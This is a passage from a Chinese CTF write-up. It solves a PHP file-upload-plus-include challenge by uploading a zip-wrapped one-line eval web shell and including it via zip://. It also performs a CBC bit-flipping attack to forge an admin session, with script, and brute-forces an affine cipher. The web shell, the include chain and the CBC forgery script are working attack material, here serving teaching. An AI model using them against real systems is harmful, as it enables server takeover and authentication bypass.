                print payload.decode('hex')
                break
得到flag
    flag{5d6352163c30ba51f1e2c0dd08622428}
## image_up
    http://101.71.29.5:10043/index.php?page=login
拿到题目发现是个登录页面，且有文件读取的风险，我们尝试读取文件
随手尝试admin admin，发现登录成功，再读upload的源码
发现文件上传，这里不难想到组合拳：lfi+upload
我们只要上传一个内容带有一句话木马的jpg，再包含即可getshell
但这里有一个难点
    $path = "uploads/".md5($temp[0].time()).".".$extension;
我们需要提前预测time()
刚开始我以为这是一道简单的time预测，但发现多次尝试多线程爆破，都无法预测到文件名
后来看到提示
想到是不是时区的问题，尝试time+8h
    time()+8*3600
随机可以预测到图片，但是新的问题来了，我们保护图片发现并没有成功，猜想是否强行拼接了.php，于是读index
    <?php
      if(isset($_GET['page'])){
        if(!stristr($_GET['page'],"..")){
          $page = $_GET['page'].".php";
          include($page);
        }else{
          header("Location: index.php?page=login");
        }
      }else{
        header("Location: index.php?page=login");
      }
发现强行拼接了.php，于是想到新的方法
    zip://
走zip协议即可
创建一个sky.php的文件，内容为
    <?php
    @eval($_POST[sky]);
然后压缩为sky.zip，改后缀名为sky.jpg
预测文件名后上传
访问路径
    http://101.71.29.5:10043/index.php?page=zip://uploads/ddf1dcc4b533d1631d81a0c58a1b3bdb.jpg%23sky
即可菜刀连接
## 好简单的密码2
nc进题目
    ➜  ~ nc 101.71.29.5 10048
    only admin can get flag!
    Menu:
    1) login
    2) info
    3) edit
    4) flag
发现有4个功能，查看了一下
    2
    iv:235d5e78277087a9cb82b8ea0ca94a47
    cipher:4721f1a3f57ed3d6fcad72461fa54815a0b7f83874919bd79bdc1e0a945c0f95c1a73bcd539f73d29cac53105dbd69bbf71a5fcef01ccaa3f9b6582d96311f47
    plain:7b27757365726e616d655f5f273a202731646d696e272c20276c6f67696e5f74696d655f5f273a20313534333035393335342e3831353837397d303030303030
    3
    new iv(must_be_16_bytes_long):
    235d5e78277087a9cb82b8ea0ca94a47
    new cipher:
    4721f1a3f57ed3d6fcad72461fa54815f0b7f83874919bd79bdc1e0a945c0f95179a145bb62d567082303b27a986e9a407763db55d5dc47c3483060be10b6946
发现info，是告诉你iv,c,m，而edit是更改iv和c
瞬间想到cbc翻转攻击
尝试登陆1dmin
    1
    Please input your username
    1dmin
    login success
查看此时的信息
    2
    iv:235d5e78277087a9cb82b8ea0ca94a47
    cipher:4721f1a3f57ed3d6fcad72461fa54815a0b7f83874919bd79bdc1e0a945c0f95c1a73bcd539f73d29cac53105dbd69bbf71a5fcef01ccaa3f9b6582d96311f47
    plain:7b27757365726e616d655f5f273a202731646d696e272c20276c6f67696e5f74696d655f5f273a20313534333035393335342e3831353837397d303030303030
进行c的构造
    cipher = ord(cipher[0]) ^ ord(‘1’) ^ ord(‘a’)
然后修改c
    3
    new iv(must_be_16_bytes_long):
    235d5e78277087a9cb82b8ea0ca94a47
    new cipher:
    1721f1a3f57ed3d6fcad72461fa54815a0b7f83874919bd79bdc1e0a945c0f95b19686d227341efdc6f68d112c2852f6165f9f345cf01e06095faa150fd430ec
此时再看个人信息
    2
    iv:235d5e78277087a9cb82b8ea0ca94a47
    cipher:1721f1a3f57ed3d6fcad72461fa54815a0b7f83874919bd79bdc1e0a945c0f95b19686d227341efdc6f68d112c2852f6165f9f345cf01e06095faa150fd430ec
    plain:dfdd2d9e4cb84a95a2dd3fcfc9e8627761646d696e272c20276c6f67696e5f74696d655f5f273a20313534333035393435372e3332363233317d303030303030
发现明文出现乱码
那么通过iv恢复第一个Block
    plain = 'dfdd2d9e4cb84a95a2dd3fcfc9e86277'.decode('hex')
    want = "{'username__': '"
    first_16 = ''
    iv = '235d5e78277087a9cb82b8ea0ca94a47'.decode('hex')
    for i in range(16):
        first_16 += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))
    newiv = first_16
    print newiv.encode('hex')
然后去再修改新的iv
    3
    new iv(must_be_16_bytes_long):
    87a706950ebaa35d043ad87ae27b0817
    new cipher:
    1721f1a3f57ed3d6fcad72461fa54815a0b7f83874919bd79bdc1e0a945c0f95b19686d227341efdc6f68d112c2852f6165f9f345cf01e06095faa150fd430ec
即可getflag
    Menu:
    1) login
    2) info
    3) edit
    4) flag
    4
    only admin can get flag
    username :admin
    flag{cce8a1ec51ac432c774d0198e388b034}
脚本如下
    from Crypto.Cipher import AES
    import base64
    # iv='235d5e78277087a9cb82b8ea0ca94a47'
    # cipher='4721f1a3f57ed3d6fcad72461fa54815a0b7f83874919bd79bdc1e0a945c0f95179a145bb62d567082303b27a986e9a407763db55d5dc47c3483060be10b6946'
    # plain='7b27757365726e616d655f5f273a202731646d696e272c20276c6f67696e5f74696d655f5f273a20313534333035383631322e3136303935367d303030303030'
    # m = plain.decode('hex')
    # # for i in range(0,len(m),16):
    # #     print m[i:i+16]
    # print cipher.encode('hex')
    plain = 'dfdd2d9e4cb84a95a2dd3fcfc9e86277'.decode('hex')
    print plain
    want = "{'username__': '"
    first_16 = ''
    iv = '235d5e78277087a9cb82b8ea0ca94a47'.decode('hex')
    for i in range(16):
        first_16 += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))
    newiv = first_16
    print newiv.encode('hex')
## 仿射
拿到题目，提示b=7，以及一串密码
    achjbnpdfherebjsw
我们知道仿射密码为
a的逆元取值范围在(1,9,21,15,3,19,7,23,11,5,17,25)
所以直接解密即可
代码如下：
    import gmpy2
    string = 'achjbnpdfherebjsw'
    b=7
    for i in (1,9,21,15,3,19,7,23,11,5,17,25):
        flag = ''
        for k in string:
            flag += chr(i*((ord(k)-ord('a'))-b)%26+ord('a'))
        print flag